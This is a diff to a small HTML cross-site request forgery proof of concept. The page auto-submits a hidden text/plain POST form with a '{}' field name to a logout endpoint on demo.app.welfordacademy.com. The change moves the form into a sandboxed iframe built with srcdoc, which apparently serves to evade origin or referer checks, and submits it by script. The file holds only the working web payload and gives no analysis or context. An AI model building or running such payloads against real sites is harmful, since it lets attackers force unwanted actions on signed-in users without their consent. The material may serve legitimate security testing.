@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html>
 <body onload="document.forms[0].submit()">
-  <form action="https://demo.app.welfordacademy.com/api/auth/logout"
-        method="POST"
-        enctype="text/plain">
-    <input type="hidden" name='{}' value="">
+  <iframe sandbox="allow-forms allow-scripts" srcdoc="
+  <form id='f' action='https://demo.app.welfordacademy.com/api/auth/logout' method='POST' enctype='text/plain'>
+    <input type='hidden' name='{}' value=''>
   </form>
+  <script>document.getElementById('f').submit()</script>
+"></iframe>
 </body>
 </html>
